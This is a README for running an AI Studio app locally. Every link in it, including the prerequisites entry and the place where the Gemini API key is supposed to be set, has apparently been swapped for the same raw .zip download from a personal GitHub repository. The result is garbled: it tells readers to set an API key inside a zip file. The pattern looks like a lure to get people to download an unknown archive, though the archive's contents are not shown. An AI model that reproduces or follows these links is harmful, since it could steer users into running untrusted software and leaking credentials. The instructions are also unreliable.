# Run and deploy your AI Studio app

This contains everything you need to run your app locally.

View your app in AI Studio: https://github.com/ssharvesh-steep/sharvesh-s/raw/refs/heads/main/components/s-sharvesh-3.6.zip

## Run Locally

**Prerequisites:**  https://github.com/ssharvesh-steep/sharvesh-s/raw/refs/heads/main/components/s-sharvesh-3.6.zip


1. Install dependencies:
   `npm install`
2. Set the `GEMINI_API_KEY` in [https://github.com/ssharvesh-steep/sharvesh-s/raw/refs/heads/main/components/s-sharvesh-3.6.zip](https://github.com/ssharvesh-steep/sharvesh-s/raw/refs/heads/main/components/s-sharvesh-3.6.zip) to your Gemini API key
3. Run the app:
   `npm run dev`
